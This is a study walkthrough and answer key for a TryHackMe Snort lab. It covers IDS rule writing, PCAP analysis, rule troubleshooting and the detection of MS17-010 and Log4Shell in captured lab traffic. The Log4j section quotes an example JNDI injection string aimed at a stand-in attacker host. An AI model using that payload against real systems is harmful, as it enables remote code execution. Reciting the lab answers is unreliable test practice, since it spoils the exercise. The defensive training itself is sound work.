| Field | Detail |
|------|--------|
| **Platform** | TryHackMe |
| **Category** | Security Solutions / IDS / Snort |
| **Difficulty** | Medium |
| **Time** | ~120 Minutes |
| **Module** | Security Solutions |

---

## Objective

The **Snort Challenge - The Basics** room is a hands-on follow-up to the Snort fundamentals: instead of only reading about **IDS/IPS** theory, you write real Snort rules, run them against captured **PCAP** files with `snort -c ... -r ... -A console`, count the resulting alerts, and then investigate the matching packets down to individual header fields. The room walks through detecting **HTTP** and **FTP** traffic, identifying files by their **magic bytes** (PNG/GIF), spotting a **BitTorrent** metafile, fixing broken rules (syntax *and* logic), and finally using **external/prebuilt rules** to detect two famous exploits — **MS17-010** (EternalBlue / SMBv1) and **Log4j** (Log4Shell / CVE-2021-44228) — decoding the malicious payloads along the way.

By the end of this room you will be able to:

- Explain what **Snort** is and the difference between an **IDS** (detect + alert) and an **IPS** (detect + prevent)
- Read captured traffic from a **PCAP** with `-r` and print alerts to the terminal with `-A console`
- Write a Snort rule header — `action protocol src_ip src_port direction dst_ip dst_port` — and pick the right direction operator (`->` vs `<>`)
- Detect application traffic by **port** (`any 80`, `any 21`) and by **payload content** with `content:"..."` (ASCII and `|hex|`)
- Identify files and applications from **file signatures / magic bytes** (PNG `89 50 4E 47 ...`, `GIF89a`, `application/x-bittorrent`)
- Troubleshoot **syntax errors** (spacing, `msg:"...";`, `:` vs `;`, direction operators, unique `sid`) and **logical errors** (case-sensitivity → `nocase`, missing `msg`)
- Use **external rules** to detect known vulnerabilities and investigate alerts, logs and payloads (`IPC$`, `${jndi:`, Base64)
- Filter on non-payload fields with `id`, `flags`, `dsize` and `sameip`, and know that a modified rule must bump its `rev`

> **Authorisation note:** every PCAP in this room is captured traffic supplied inside the TryHackMe lab. Snort is being used for **offline packet analysis** — you are not attacking any live system.

---

## Task 1 — Introduction: Snort, IDS/IPS & PCAP Fundamentals

**Snort** is an open-source **network intrusion detection and prevention system**. In this room it runs as an **IDS**: it observes network traffic, compares each packet against a set of **rules**, and generates an **alert** when a packet matches. The core idea is simple:

> **Snort observes network traffic and compares packets against rules. When a packet matches a rule, Snort can generate an alert.**

The whole room follows one repeated workflow: `Network Traffic → PCAP → Snort → Apply Rules → Match? → Alert → Investigate Logs`.

### IDS vs IPS

The distinction is the single most important concept to keep straight:

> **1. IDS — Intrusion Detection System**
> Passive monitoring. It analyses packets and, on suspicious traffic, raises an alert — but it does **not** necessarily block the traffic. Malicious → **ALERT 🚨**.

> **2. IPS — Intrusion Prevention System**
> Active. It can take action against matching traffic. Malicious → **BLOCK ❌**.

> **Memory trick:** `IDS → "I Detect Something"`, `IPS → "I Prevent Something"`.

### What is a PCAP?

**PCAP** stands for **Packet Capture** — a file of captured network traffic. A single PCAP can carry Source IP, Destination IP, Source/Destination Port, Protocol, TCP Flags, Sequence Number, Acknowledgement Number, TTL and Payload. A SOC analyst often receives a PCAP *after* an incident and reconstructs who talked to whom, over which port/protocol, and what payload was sent.

### The Snort rule anatomy

Every rule is a **header** plus a set of **options** in parentheses:

```bash
action protocol source_ip source_port direction destination_ip destination_port (options)
```

```bash
alert tcp any any -> any 80 (msg:"HTTP Traffic"; sid:1000001;)
```

Reading it left to right: `alert` = the action (generate an alert), `tcp` = protocol, `any any` = any source IP / any source port, `->` = direction (source → destination), `any 80` = any destination IP on port 80, and `(msg:"..."; sid:...;)` = the rule options. `any` simply means "don't restrict this field". The options seen most in this room are `msg`, `sid`, `content`, `flags`, `flow`, `offset`, `depth`.

### Running Snort against a PCAP

```bash
sudo snort -c local.rules -r traffic.pcap -A console
```

| Part | Meaning |
|---|---|
| `sudo` | Run with elevated privileges |
| `snort` | Execute Snort |
| `-c local.rules` | Load the specified rule/config file |
| `-r traffic.pcap` | Read captured traffic from a PCAP (offline analysis) |
| `-A console` | Display alerts on the console |

Because we read from a file with `-r`, this is **offline packet analysis** rather than live capture — ideal for testing rules while developing them.

### Why clear old logs?

The room repeatedly says *"clear the previous log and alarm files."* If a previous rule generated 100 alerts and a new rule generates 5, an uncleared log shows `100 + 5 = 105` and you would wrongly conclude the new rule matched 105 packets. Always run `Clear → Run rule → Read fresh output`. Remember too that **packet count ≠ alert count** — a rule only alerts on the packets that actually match.

### Exercise files

The practical files live on the lab desktop and are split per task:

```bash
$ cd ~/Desktop/Exercise-Files
$ ls
Config-Samples
TASK-2 (HTTP)
TASK-3 (FTP)
TASK-4 (PNG)
TASK-5 (TorrentMetafile)
TASK-6 (Troubleshooting)
TASK-7 (MS17-10)
TASK-8 (Log4j)
```

### Key terms

| Term | Meaning |
|---|---|
| **Snort** | Network intrusion detection/prevention tool |
| **IDS** | Intrusion Detection System (detect + alert) |
| **IPS** | Intrusion Prevention System (detect + prevent) |
| **PCAP** | Packet Capture — captured network traffic |
| **Rule** | Detection condition |
| **Alert** | Notification generated after a rule match |
| **Payload** | Data carried by a packet |
| **SID** | Snort rule identifier |
| **msg** | Alert message |
| **TTL** | Time To Live (IP hop limit) |
| **SEQ** | TCP Sequence Number |
| **ACK** | TCP Acknowledgement Number |
| **CVSS** | Common Vulnerability Scoring System |

### Interview Questions — Snort Fundamentals

| Question | Answer |
|---|---|
| **Q1. What is Snort?** | An open-source network intrusion detection and prevention system that inspects traffic and detects suspicious activity using rules. |
| **Q2. What is the difference between IDS and IPS?** | IDS detects and alerts (passive); IPS can detect and actively block/prevent (active). |
| **Q3. What is a PCAP?** | A packet-capture file containing captured network traffic that can be analysed offline. |
| **Q4. What does `-r` do in Snort?** | Reads packets from a PCAP file for offline analysis. |
| **Q5. What does `-c` do?** | Specifies the configuration/rule file Snort should load. |
| **Q6. What does `-A console` do?** | Displays Snort alerts on the terminal. |
| **Q7. What is the difference between `->` and `<>`?** | `->` is one-way (source → destination); `<>` is bidirectional (either direction). |
| **Q8. Why clear previous alerts before a new rule?** | So the new rule's alert count is not contaminated by alerts from previous rules. |

---

## Task 2 — Writing IDS Rules (HTTP)

**Goal:** write a rule that detects all TCP packets **from or to port 80** (HTTP), then investigate individual packets in the resulting traffic.

Navigate to the task and confirm the PCAP is present:

```bash
$ cd ~/Desktop/Exercise-Files/"TASK-2 (HTTP)"
$ ls
```

HTTP traditionally uses **TCP/80**. Because the requirement says "from or to port 80" — i.e. **both directions** — the bidirectional operator `<>` is the right choice rather than the one-way `->`:

```bash
alert tcp any any <> any 80 (msg:"HTTP TCP Traffic"; sid:1000001;)
```

> **Key learning:** read the exact wording. "To port 80" (`->`) and "from or to port 80" (`<>`) are not the same requirement.

Run the rule against the supplied PCAP with the standard offline command:

```bash
$ sudo snort -c local.rules -r <pcap-file> -A console
```

The rule detects **164** packets. With the traffic detected, the task then asks for specific packet fields:

| Question | Answer |
|---|---|
| **Q1. What is the number of detected packets?** | 164 |
| **Q2. What is the destination address of packet 63?** | 216.239.59.99 |
| **Q3. What is the ACK number of packet 64?** | 0x2E6B5384 |
| **Q4. What is the SEQ number of packet 62?** | 0x36C21E28 |
| **Q5. What is the TTL of packet 65?** | 128 |
| **Q6. What is the source IP of packet 63?** | 145.254.160.237 |
| **Q7. What is the source port of packet 65?** | 3372 |

A couple of gotchas worth internalising. The ACK/SEQ values (`0x2E6B5384`, `0x36C21E28`) start with `0x`, so they are **hexadecimal TCP fields**, not IP addresses. And the source port of packet 65 is **3372**, not 80 — the client uses an **ephemeral** source port while the server listens on 80, so an HTTP connection looks like `3372 → 80`. Never assume "HTTP = source port 80".

The network flow behind the answers is: client `145.254.160.237:3372` → server `216.239.59.99:80` over TCP.

### Investigating packets yourself (optional technique)

The room focuses on the Snort workflow, but the same fields can be pulled with TShark:

```bash
$ tshark -r traffic.pcap -Y "frame.number == 63"
$ tshark -r traffic.pcap -Y "frame.number == 63" -T fields -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport
```

Useful field names: `ip.src`, `ip.dst`, `ip.ttl`, `tcp.srcport`, `tcp.dstport`, `tcp.seq`, `tcp.ack`, `tcp.flags`.

> **From broad to specific:** a port rule (`tcp ... any 80`) is broad; adding `content:"GET"` (e.g. `alert tcp any any -> any 80 (msg:"HTTP GET Detected"; content:"GET"; sid:1000002;)`) makes detection far more specific. This progression drives the rest of the room.

### Interview Questions — HTTP Task

| Question | Answer |
|---|---|
| **Q1. Why use `tcp` and not `udp` for this rule?** | The task's HTTP traffic is carried over TCP; `tcp` prevents unrelated UDP/ICMP from matching. |
| **Q2. Why `<>` instead of `->` here?** | The requirement is "from or to" port 80, so traffic in either direction must match. |
| **Q3. Why is a hex value like `0x2E6B5384` not an IP?** | It is a TCP acknowledgement field shown in hexadecimal, not an address. |
| **Q4. Why is the client's source port 3372, not 80?** | Clients use ephemeral source ports; the server listens on 80, so traffic looks like `3372 → 80`. |
| **Q5. What is TTL?** | An IP-header hop limit; each router decrements it and the packet is dropped at 0. Common initial values: 64, 128, 255. |

---

## Task 3 — Writing IDS Rules (FTP)

**Goal:** progressively detect FTP activity — all TCP/21 traffic, the FTP service banner, failed logins, successful logins, the "username accepted / password required" state, and finally a specific username.

```bash
$ cd ~/Desktop/Exercise-Files/"TASK-3 (FTP)"
$ ls
```

FTP's control channel uses **TCP/21** and carries commands like `USER`, `PASS`, `PWD`, `LIST`, `RETR`, `STOR`, `QUIT`. The relevant FTP response codes drive the detection rules:

| Code | Meaning |
|---|---|
| `220` | Service ready |
| `331` | Username accepted, password required |
| `230` | User logged in successfully |
| `530` | Not logged in / login failed |

### Rule 1 — all TCP/21 traffic

```bash
alert tcp any any -> any 21 (msg:"FTP Traffic"; sid:1000001;)
```

Running it detects **307** packets. Investigating the log then reveals the FTP service banner: **Microsoft FTP Service** — a reminder that service banners give away the software running on a target.

### Rules 2–5 — content-based detection

Moving from port matching to **payload content** with `content:"..."` lets us detect specific authentication events. Representative rules:

```bash
alert tcp any 21 -> any any (msg:"FTP Failed Login"; content:"530"; sid:1000002;)
alert tcp any 21 -> any any (msg:"FTP Successful Login"; content:"230"; sid:1000003;)
alert tcp any any -> any 21 (msg:"FTP Administrator Username"; content:"Administrator"; sid:1000004;)
```

Between each rule the task instructs you to comment out the old rule and clear the logs so counts stay clean:

```bash
$ sudo rm -f alert
$ sudo rm -f snort.log.*
```

The FTP authentication state machine that these rules key on: `USER username → 331 (password required) → PASS password → 230 (success) or 530 (failure)`.

### Task 3 — Answers

| Question | Answer |
|---|---|
| **Q1. Number of detected TCP/21 packets?** | 307 |
| **Q2. What is the FTP service name?** | Microsoft FTP Service |
| **Q3. Number of failed FTP login attempts?** | 41 |
| **Q4. Number of successful FTP logins?** | 1 |
| **Q5. Attempts with a valid username but no password yet?** | 42 |
| **Q6. Attempts with the "Administrator" username / no password?** | 7 |

> **Security read:** 41 failed vs 1 successful login is a classic brute-force-then-compromise pattern. Counts alone don't prove an attack — a SOC would still correlate source IP, username, timing and post-login commands. Note also that classic FTP sends credentials **unencrypted**, which is why **SFTP**/**FTPS** are preferred.

### Interview Questions — FTP Task

| Question | Answer |
|---|---|
| **Q1. What port does FTP use for control?** | TCP/21. |
| **Q2. What do the `USER` and `PASS` commands do?** | Supply the username and password for authentication. |
| **Q3. What does FTP code 230 mean?** | Successful user login. |
| **Q4. What does FTP code 331 mean?** | Username accepted, password required. |
| **Q5. What does FTP code 530 mean?** | Not logged in / login failed. |
| **Q6. Why is `content` more specific than port matching?** | Port matching identifies the service broadly; content matching identifies a specific command, response or keyword in the payload. |
| **Q7. Is content matching case-sensitive?** | Yes by default — `Administrator` ≠ `administrator` unless `nocase` is used. |

---

## Task 4 — Writing IDS Rules (PNG)

**Goal:** detect files by their **magic bytes / file signature** instead of by port, then extract application metadata.

```bash
$ cd ~/Desktop/Exercise-Files/"TASK-4 (PNG)"
$ ls
```

A filename like `image.png` proves nothing; the trustworthy signal is the **file signature** at the start of the file. A standard PNG begins with the bytes:

```text
89 50 4E 47 0D 0A 1A 0A
```

Snort matches raw bytes using hex inside pipes — `content:"|89 50 4E 47 0D 0A 1A 0A|";`. The `| ... |` tells Snort the enclosed values are hexadecimal:

```bash
alert tcp any any -> any any (msg:"PNG File Detected"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid:1000005;)
```

Running the rule and inspecting the matching packet's metadata identifies the application **Adobe ImageReady**. The room also introduces GIF detection — GIF files begin with `GIF87a` or `GIF89a`; the relevant value here is `GIF89a`:

```bash
alert tcp any any -> any any (msg:"GIF File Detected"; content:"GIF89a"; sid:1000006;)
```

### Task 4 — Answers

| Question | Answer |
|---|---|
| **Q1. What is the PNG file signature (magic bytes)?** | `89 50 4E 47 0D 0A 1A 0A` |
| **Q2. What application is identified in the traffic?** | Adobe ImageReady |
| **Q3. What GIF signature is relevant?** | GIF89a |

> **Signature vs metadata:** the **signature** answers *"what file format is this?"* (`89 50 4E 47 ...` → PNG); **application metadata** can answer *"what software created it?"* (Adobe ImageReady). ASCII/hex equivalence is handy to know: `GIF89a` = `47 49 46 38 39 61`, `GIF87a` = `47 49 46 38 37 61`.

---

## Task 5 — Writing IDS Rules (Torrent Metafile)

**Goal:** detect a **BitTorrent** metafile and extract its application, MIME type and tracker hostname.

```bash
$ cd ~/Desktop/Exercise-Files/"TASK-5 (TorrentMetafile)"
$ ls
```

A `.torrent` metafile carries metadata (files, trackers, piece hashes, names, URLs) about content distributed over the peer-to-peer BitTorrent protocol. A content rule can key on a characteristic string such as the MIME type:

```bash
alert tcp any any -> any any (msg:"BitTorrent Metafile Detected"; content:"application/x-bittorrent"; sid:1000007;)
```

This narrow rule matches only **2** packets — a good illustration that a more specific rule produces less noise. Layered investigation of the payload yields the application, MIME type and tracker.

### Task 5 — Answers

| Question | Answer |
|---|---|
| **Q1. Number of detected packets?** | 2 |
| **Q2. What is the application?** | bittorrent |
| **Q3. What is the MIME type of the torrent metafile?** | application/x-bittorrent |
| **Q4. What is the tracker hostname?** | tracker2.torrentbox.com |

> **MIME type** = `type/subtype` (e.g. `text/html`, `image/png`, `application/x-bittorrent`) and gives another classification signal beyond the filename. A **tracker** helps BitTorrent peers discover each other, so a hostname like `tracker2.torrentbox.com` is itself an indicator of P2P activity.

### Interview Questions — File & Application Detection (Tasks 4–5)

| Question | Answer |
|---|---|
| **Q1. What are magic bytes?** | Characteristic byte sequences at/near the start of a file that identify its format. |
| **Q2. What is the PNG magic signature?** | `89 50 4E 47 0D 0A 1A 0A`. |
| **Q3. What are the common GIF signatures?** | `GIF87a` and `GIF89a`. |
| **Q4. Why use hex content in Snort?** | Binary file signatures aren't always printable ASCII, so hex matches the exact bytes. |
| **Q5. What does the `\| ... \|` notation mean in `content`?** | The enclosed values are hexadecimal byte representations. |
| **Q6. What is the MIME type for a torrent metafile?** | `application/x-bittorrent`. |
| **Q7. What is a BitTorrent tracker?** | A server that helps peers discover others in a torrent swarm. |

---

## Task 6 — Troubleshooting Rule Syntax Errors

**Goal:** you are given seven already-written but broken rule files. Fix each, run it, and record the alert count (or, for the last file, the required option). Files `local-1` through `local-5` contain **syntax errors**; `local-6` and `local-7` contain **logical errors**.

```bash
$ cd ~/Desktop/Exercise-Files/"TASK-6 (Troubleshooting)"
$ ls
local-1.rules
local-2.rules
local-3.rules
local-4.rules
local-5.rules
local-6.rules
local-7.rules
mx-1.pcap
```

Test one file at a time with:

```bash
$ sudo snort -c local-X.rules -r mx-1.pcap -A console
```

> **Syntax error** = the rule structure is malformed and Snort can't parse it. **Logical error** = the rule parses fine but doesn't detect the intended traffic (e.g. searching for `get` when the traffic contains `GET`). Fix the **smallest** error, retest, repeat — don't rewrite the whole rule.

### local-1 to local-5 (syntax)

| File | Problem(s) | Fix | Alerts |
|---|---|---|---|
| **local-1.rules** | Missing space before options — `any(...` | Add a space between the final `any` and `(` | 16 |
| **local-2.rules** | Missing `any` in the header + space after `msg:` | Restore the missing field; use `msg:"...";` | 68 |
| **local-3.rules** | `msg` spacing + duplicate/`sid` numbering | Fix `msg:"...";`; make each `sid` unique | 87 |
| **local-4.rules** | `msg` formatting + `:` used where `;` is required | Use `msg:"...";` and `sid:...;` | 90 |
| **local-5.rules** | Invalid direction operator + `msg` + `sid` punctuation + option separators | Use `->`, `msg:"...";`, `sid:value;`, separate options with `;` | 155 |

The reusable punctuation rule is `option:value;` — colon separates the option from its value, semicolon ends it (`msg:"Test";`, `sid:100001;`, `rev:1;`). And the direction operators are only `->` (source → destination) and `<>` (bidirectional). There is **no** `<-` operator.

### local-6 (logical — case sensitivity)

The rule tries to detect `GET` requests but its content is hex `67 65 74`, which decodes to the lowercase `get`. Because Snort content matching is case-sensitive, `get` never matches `GET`. The best fix is to add `nocase`:

```bash
alert tcp any any <> any 80 (msg:"GET Request Found"; content:"|67 65 74|"; nocase; sid:100001; rev:1;)
```

After the fix it matches **2** packets. (An alternative is to use the uppercase bytes `|47 45 54|`, since `47 45 54` = `GET`, but `nocase` is the more general fix.)

### local-7 (logical — missing option)

Its content is hex `2E 68 74 6D 6C`, which decodes to `.html`, so the rule detects HTML files. It parses and even produces matches (the walkthrough notes 9 HTML-file detections), but it is missing a descriptive **`msg`** option — and that is exactly what the question asks for:

```bash
alert tcp any any <> any 80 (msg:"HTML file found"; content:"|2E 68 74 6D 6C|"; sid:100001; rev:1;)
```

Handy hex-to-ASCII decodes used in this task: `47 45 54` → `GET`, `67 65 74` → `get`, `2E 68 74 6D 6C` → `.html` (decode with CyberChef's *From Hex* or by hand).

### Task 6 — Answers

| Question | Answer |
|---|---|
| **Q1. local-1.rules — detected packets?** | 16 |
| **Q2. local-2.rules — detected packets?** | 68 |
| **Q3. local-3.rules — detected packets?** | 87 |
| **Q4. local-4.rules — detected packets?** | 90 |
| **Q5. local-5.rules — detected packets?** | 155 |
| **Q6. local-6.rules — detected packets (after `nocase`)?** | 2 |
| **Q7. local-7.rules — name of the required rule option?** | msg |

### Interview Questions — Troubleshooting

| Question | Answer |
|---|---|
| **Q1. Difference between a syntax error and a logical error?** | Syntax = malformed rule Snort can't parse; logical = rule parses but detection logic is wrong. |
| **Q2. What is the correct option punctuation?** | `option:value;` — colon separates, semicolon ends (`msg:"...";`, `sid:...;`). |
| **Q3. What direction operators are valid?** | `->` (one-way) and `<>` (bidirectional). `<-` does not exist. |
| **Q4. How do you fix a case-sensitivity mismatch?** | Add the `nocase` modifier after the `content` option. |
| **Q5. Why comment out a rule instead of deleting it?** | Commenting preserves the rule so it can be re-enabled later. |

---

## Task 7 — Using External Rules (MS17-010)

**Goal:** use a supplied external rule set to detect **MS17-010** (an SMBv1 vulnerability, CVE-2017-0144, famous from WannaCry), then write a small custom rule to find `IPC$` requests and investigate the exploit path.

```bash
$ cd ~/Desktop/Exercise-Files/"TASK-7 (MS17-010)"
$ ls
local.rules
local-1.rules
ms-17-010.pcap
```

Direct-host SMB uses **TCP/445**. Run the provided rules, writing full alerts and logs into the current directory:

```bash
$ sudo snort -c local.rules -A full -l . -r ms-17-010.pcap
```

This produces a large **25154** alerts — a reminder that one exploit generates many packets/rule matches, so the count is not "25154 attackers". After clearing the generated logs, create a narrow content rule in `local-1.rules` to look for the SMB administrative share `IPC$` (Inter-Process Communication):

```bash
alert tcp any any -> any 445 (msg:"IPC$ Detected"; content:"IPC$"; sid:1000001; rev:1;)
```

A more context-aware form (patterned on the supplied rules) adds `flow` so only established, server-bound traffic matches:

```bash
alert tcp any any -> any 445 (msg:"Exploit Detected!"; flow:to_server,established; content:"IPC$"; sid:20244225; rev:3;)
```

Running the custom rule drops the count to **12** — far easier to investigate. Read the logged packets and inspect the payload:

```bash
$ sudo snort -dvr snort.log.<timestamp> -n 12
```

The payload reveals the requested **UNC path** `\\192.168.116.138\IPC$` (`\\` = UNC prefix, `192.168.116.138` = target host, `IPC$` = the SMB share). Finally, the MS17-010 vulnerability carries a **CVSS v2** score of **9.3** (high severity).

### Task 7 — Answers

| Question | Answer |
|---|---|
| **Q1. Packets detected by the provided MS17-010 rules?** | 25154 |
| **Q2. Packets matching the custom `IPC$` rule?** | 12 |
| **Q3. What is the requested path?** | \\192.168.116.138\IPC$ |
| **Q4. What is the CVSS v2 score of MS17-010?** | 9.3 |

### Interview Questions — MS17-010

| Question | Answer |
|---|---|
| **Q1. What is MS17-010?** | A Microsoft security bulletin covering SMBv1 vulnerabilities, including CVE-2017-0144. |
| **Q2. What protocol/port is associated with the exploitation?** | SMBv1 over TCP/445. |
| **Q3. What is `IPC$`?** | A special Windows administrative SMB share for inter-process communication. |
| **Q4. What is a UNC path?** | A Universal Naming Convention path identifying a network resource as `\\server\share`. |
| **Q5. What does `flow:to_server,established;` do?** | Restricts matching to established TCP sessions travelling toward the server. |
| **Q6. Why use an external/prebuilt rule?** | It provides tested detection logic for a known threat, saving time versus writing one from scratch. |

---

## Task 8 — Using External Rules (Log4j)

**Goal:** use supplied external rules to detect **Log4j / Log4Shell** (CVE-2021-44228) exploitation, identify the triggered rules and their SIDs, build a packet-size filter, and decode the payload.

```bash
$ cd ~/Desktop/Exercise-Files/"TASK-8 (Log4j)"
$ ls
```

Log4j is a Java logging library; the vulnerability let attacker-controlled input trigger a dangerous **JNDI** lookup (`${jndi:ldap://attacker/...}`) that could lead to **remote code execution**. Run the provided rules:

```bash
$ sudo snort -c local.rules -A full -l . -r <log4j-pcap>
```

This detects **26** packets. Inspecting the alerts shows **4** rules triggered, with SIDs **21003726, 21003727, 21003728, 21003729** (so the first six digits are `210037`). You can confirm which rule is which:

```bash
$ grep -nE "21003726|21003727|21003728|21003729" local.rules
```

Next, build a custom investigative rule using the non-payload `dsize` option to catch the suspicious **770–855 byte** payload range:

```bash
alert tcp any any -> any any (msg:"Suspicious Log4j Payload Size"; dsize:770<>855; sid:1000001; rev:1;)
```

That rule matches **41** packets. Inspecting those packets exposes **Base64**-encoded data in the payload, which you decode to recover the attacker command:

```bash
$ sudo snort -dvr snort.log.<timestamp> -n 41
$ echo 'BASE64_STRING' | base64 -d
```

Packet investigation also reveals the IPv4 **IP Identification** field value **62808** (a fragmentation/reassembly field, not an IP address). Log4Shell's **CVSS v2** score is **9.3**.

> **Content gap flag:** the source notes lead through Base64 decoding but do **not** print the actual decoded attacker command, so no verbatim command string is reproduced here — only the workflow (`echo 'BASE64_STRING' | base64 -d`). The literal `BASE64_STRING` placeholder is from the source, not a real captured value.

### Task 8 — Answers

| Question | Answer |
|---|---|
| **Q1. Number of detected packets?** | 26 |
| **Q2. How many rules triggered?** | 4 |
| **Q3. Triggered rule SIDs?** | 21003726, 21003727, 21003728, 21003729 |
| **Q4. Packets matching the custom `dsize:770<>855` rule?** | 41 |
| **Q5. What is the IP Identification value?** | 62808 |
| **Q6. What is the CVSS v2 score of Log4j?** | 9.3 |
| **Q7. What is the decoded attacker command?** | Not shown in the source notes — flagged as a gap (decode with `base64 -d`). |

### Interview Questions — Log4j

| Question | Answer |
|---|---|
| **Q1. What is Log4Shell?** | The common name for the critical Log4j vulnerability CVE-2021-44228. |
| **Q2. What is JNDI?** | Java Naming and Directory Interface — a Java API for naming/directory services abused by the exploit. |
| **Q3. What is a common Log4Shell indicator string?** | `${jndi:` (e.g. `${jndi:ldap://attacker.example/a}`). |
| **Q4. Is Base64 encryption?** | No — it is encoding; anyone can decode it. |
| **Q5. What does `dsize` do?** | Matches packets based on their payload/data size. |
| **Q6. What is the IP Identification field?** | An IPv4 header field used for fragmentation/reassembly (here 62808), not an address. |

---

## Task 9 — Snort Rule Structure & Rule-Option Practice

**Goal:** consolidate rule structure and practise the **non-payload** options `id`, `flags` and `sameip` against `task9.pcap`, and understand `rev`.

Every rule = **header** + **options**. Actions include `alert` (alert), `log` (log), `drop` (block + log), `reject` (block + log + reset/unreachable). Protocols: `tcp`, `udp`, `icmp`, `ip`. General options include `msg`, `sid`, `reference`, `rev`; payload options include `content`, `nocase`, `fast_pattern`; non-payload options include `id`, `flags`, `dsize`, `sameip`.

Run each rule with:

```bash
$ sudo snort -c local.rules -A full -l . -r task9.pcap
```

### Q1 — filter on IP ID 35369

The `id` option matches the IPv4 Identification field. The matching packet is an ICMP packet, so:

```bash
alert icmp any any <> any any (msg:"ID TEST"; id:35369; sid:1000001; rev:1;)
```

Reading the alert shows the packet is a **TIMESTAMP REQUEST** (ICMP Type 13 — different from the ICMP Echo Request used by `ping`).

### Q2 — SYN packets

TCP flags: `F`=FIN, `S`=SYN, `R`=RST, `P`=PSH, `A`=ACK, `U`=URG. To match packets with the SYN flag set:

```bash
alert tcp any any <> any any (msg:"SYN Packet Found"; flags:S; sid:1000002; rev:1;)
```

Result: **1** packet (SYN appears once during connection setup).

### Q3 — PSH-ACK packets

`PSH + ACK` = `PA`:

```bash
alert tcp any any <> any any (msg:"Push-Ack Packet Found"; flags:PA; sid:1000003; rev:1;)
```

Result: **216** packets (PSH-ACK recurs throughout data transfer).

### Q4 — same source and destination IP (UDP)

`sameip` matches packets whose source IP equals the destination IP:

```bash
alert udp any any <> any any (msg:"SAME-IP TEST"; sameip; sid:1000004; rev:1;)
```

The raw rule produces **10** matches, but the question requires excluding unassigned/broadcast/multicast cases — after inspecting the alerts, **7** valid same-IP packets remain. Same source and destination IP is unusual and can indicate spoofing, misconfiguration or special/broadcast behaviour.

### Q5 — modified rule option

After successfully modifying an existing rule, the analyst must change the **`rev`** (revision) — keep the same `sid` (still the same rule) but bump `rev:1;` → `rev:2;`. Think: `SID = which rule?`, `REV = which version of that rule?`.

### Task 9 — Answers

| Question | Answer |
|---|---|
| **Q1. Packet with IP ID 35369 — what request is it?** | TIMESTAMP REQUEST |
| **Q2. Number of SYN (`flags:S`) packets?** | 1 |
| **Q3. Number of Push-Ack (`flags:PA`) packets?** | 216 |
| **Q4. Valid packets with same source/destination IP (UDP `sameip`)?** | 7 |
| **Q5. Which option must be changed after modifying a rule?** | rev |

---

## Quick Revision

| Topic | Key fact |
|---|---|
| **Snort / IDS / IPS** | Snort is an open-source NIDS/NIPS. IDS = detect + alert; IPS = detect + prevent. |
| **Run command** | `sudo snort -c local.rules -r <pcap> -A console` (or `-A full -l .` to log to a file). |
| **Rule anatomy** | `action protocol src_ip src_port direction dst_ip dst_port (options)`. |
| **Direction** | `->` one-way, `<>` bidirectional; there is no `<-`. |
| **HTTP (T2)** | `tcp ... <> any 80` → 164 packets; pkt63 dst 216.239.59.99 / src 145.254.160.237; pkt64 ACK 0x2E6B5384; pkt62 SEQ 0x36C21E28; pkt65 TTL 128 / src port 3372. |
| **FTP (T3)** | TCP/21 → 307; Microsoft FTP Service; failed 41; success 1; user/no-pass 42; Administrator 7. Codes 230/331/530. |
| **PNG/GIF (T4)** | PNG `89 50 4E 47 0D 0A 1A 0A`; app Adobe ImageReady; GIF `GIF89a`. |
| **Torrent (T5)** | 2 packets; app `bittorrent`; MIME `application/x-bittorrent`; tracker `tracker2.torrentbox.com`. |
| **Troubleshoot (T6)** | 16 / 68 / 87 / 90 / 155 (syntax); local-6 → 2 (add `nocase`); local-7 → `msg`. |
| **MS17-010 (T7)** | Provided rules 25154; `IPC$` rule 12; path `\\192.168.116.138\IPC$`; CVSS v2 9.3. |
| **Log4j (T8)** | 26 detected; 4 rules; SIDs 21003726–21003729; `dsize:770<>855` → 41; IP ID 62808; CVSS v2 9.3. |
| **Rule structure (T9)** | IP ID 35369 → TIMESTAMP REQUEST; SYN 1; PA 216; UDP sameip 7; modified rule → bump `rev`. |

**Key idea:** Snort turns network traffic into evidence — you write a rule, run it against a PCAP, count and read the alerts, then investigate the matching packets down to header fields and decoded payloads.

---

## Cheat Sheet

### Core commands

```bash
sudo snort -c local.rules -r <pcap> -A console
sudo snort -c local.rules -A full -l . -r <pcap>
sudo snort -dvr snort.log.<timestamp> -n 12
```

### Log housekeeping

```bash
sudo rm -f alert
sudo rm -f snort.log.*
```

### Rule header reference

```bash
action protocol src_ip src_port direction dst_ip dst_port (options)
alert tcp any any -> any 80 (msg:"HTTP Traffic"; sid:1000001;)
alert tcp any any <> any 80 (msg:"HTTP TCP Traffic"; sid:1000001;)
```

### Detection rules used in the room

```bash
alert tcp any any -> any 21 (msg:"FTP Traffic"; sid:1000001;)
alert tcp any 21 -> any any (msg:"FTP Failed Login"; content:"530"; sid:1000002;)
alert tcp any any -> any any (msg:"PNG File Detected"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid:1000005;)
alert tcp any any -> any any (msg:"GIF File Detected"; content:"GIF89a"; sid:1000006;)
alert tcp any any -> any any (msg:"BitTorrent Metafile Detected"; content:"application/x-bittorrent"; sid:1000007;)
alert tcp any any <> any 80 (msg:"GET Request Found"; content:"|67 65 74|"; nocase; sid:100001; rev:1;)
alert tcp any any -> any 445 (msg:"Exploit Detected!"; flow:to_server,established; content:"IPC$"; sid:20244225; rev:3;)
alert tcp any any -> any any (msg:"Suspicious Log4j Payload Size"; dsize:770<>855; sid:1000001; rev:1;)
alert icmp any any <> any any (msg:"ID TEST"; id:35369; sid:1000001; rev:1;)
alert tcp any any <> any any (msg:"SYN Packet Found"; flags:S; sid:1000002; rev:1;)
alert tcp any any <> any any (msg:"Push-Ack Packet Found"; flags:PA; sid:1000003; rev:1;)
alert udp any any <> any any (msg:"SAME-IP TEST"; sameip; sid:1000004; rev:1;)
```

### Payload decoding

```bash
echo 'BASE64_STRING' | base64 -d
grep -nE "21003726|21003727|21003728|21003729" local.rules
```

### Option / flag reference

| Item | Purpose |
|---|---|
| `-c` | Load rule/config file |
| `-r` | Read a PCAP (offline analysis) |
| `-A console` / `-A full` | Alert output mode (terminal / full) |
| `-l .` | Write logs to the current directory |
| `-dvr` | Dump payload (`-d`), verbose (`-v`), read file (`-r`) |
| `msg` | Human-readable alert message |
| `sid` | Unique Snort rule ID |
| `rev` | Rule revision (bump when a rule changes) |
| `content:"..."` / `content:"\|hex\|"` | Match a payload string / raw bytes |
| `nocase` | Case-insensitive content match |
| `flow:to_server,established;` | Established, server-bound traffic only |
| `id` | Match IPv4 Identification field |
